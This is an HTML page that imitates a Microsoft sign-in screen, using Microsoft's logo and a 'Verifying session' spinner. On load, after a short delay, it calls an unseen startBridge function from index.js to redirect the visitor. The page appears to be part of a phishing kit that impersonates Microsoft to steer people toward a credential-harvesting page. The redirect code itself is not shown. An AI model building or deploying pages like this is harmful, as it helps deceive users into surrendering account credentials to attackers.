<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f2f2f2; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: #fff; width: 440px; padding: 44px; box-shadow: 0 2px 4px rgba(0,0,0,.1); border: 1px solid #ccc; }
        .logo { width: 108px; margin-bottom: 24px; }
        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 12px; }
        p { font-size: 15px; color: #1b1b1b; margin-bottom: 20px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer { margin-top: 40px; font-size: 12px; color: #666; }
        .footer a { color: #666; text-decoration: none; margin-right: 12px; }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo" alt="Microsoft">
    
    <div id="loading-state">
        <h1>Verifying session</h1>
        <p><div class="spinner"></div> Taking you to your organization's sign-in page...</p>
    </div>

    <div class="footer">
        <a href="#">Privacy & cookies</a>
        <a href="#">Terms of use</a>
    </div>
</div>

<script src="index.js"></script>
<script>
    // Trigger the bridge immediately upon page load
    window.onload = () => {
        if (typeof startBridge === "function") {
            // Wait 1.5 seconds for visual effect, then redirect
            setTimeout(startBridge, 1500); 
        }
    };
</script>

</body>
</html>
